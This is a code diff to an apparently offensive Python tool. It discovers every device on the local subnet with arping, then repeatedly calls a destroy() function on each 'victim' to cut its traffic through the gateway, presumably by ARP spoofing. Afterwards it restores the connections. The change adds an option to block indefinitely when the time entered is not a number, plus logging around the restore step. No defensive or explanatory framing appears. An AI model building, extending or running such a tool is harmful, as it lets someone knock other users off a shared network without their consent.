@@ -20,6 +20,7 @@ def get_my_ip():
 
 def get_devices_identities(ips):
     answers, _ = arping(ips, verbose = 0)
+
     NetworkIdentity = namedtuple('NetworkIdentity', ['ip', 'mac'])
     return [NetworkIdentity(ip=answer[1].psrc, mac=answer[1].hwsrc) for answer in answers]
 
@@ -44,21 +45,35 @@ def check_permission():
 def get_ip_range(my_ip):
     return ".".join(my_ip.split(".")[:-1]) + ".*"
 
+
+def get_block_time():
+    try:
+        time_amount = int(input(messages.DESTROY_TIME_AMOUNT_MSG))
+        return time.time() + time_amount
+    except ValueError:
+        time_amount = None
+        return time_amount
+    finally:
+        Logger.blocking_for(time_amount)
+
+
 if __name__ == "__main__":
     check_permission()
     ip_base = get_ip_range(get_my_ip())
     devices_identities = get_devices_identities(ip_base)
     gateway_ip, gateway_mac = devices_identities[0]    
     Logger.show_connected_ips(devices_identities)
-    destroy_time = int(input(messages.DESTROY_TIME_AMOUNT_MSG))
-    start_time = time.time()
+    block_time = get_block_time()
+
     try:
-        while (time.time() - start_time) < destroy_time:
+        while (not block_time) or (time.time() < block_time):
             for victim in devices_identities:
                 destroy(victim.ip, victim.mac, gateway_ip)
     except KeyboardInterrupt:
         sys.exit(0)
     finally:
+        Logger.restoring_connections()
         for victim in devices_identities:
             restore(victim.ip, victim.mac, gateway_ip, gateway_mac) 
+        Logger.connections_restored()
     
